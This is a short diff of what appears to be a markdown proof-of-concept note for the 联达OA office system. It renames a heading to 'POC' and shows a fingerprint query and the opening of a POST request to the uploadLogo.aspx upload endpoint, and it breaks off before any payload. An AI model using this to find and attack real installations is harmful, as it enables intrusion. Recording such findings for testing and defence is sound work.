@@ -5,7 +5,7 @@
 app="联达OA"
 ```
 
-## poc
+## POC
 ```
 POST /Hosp_Portal/uploadLogo.aspx HTTP/1.1
 Host: 
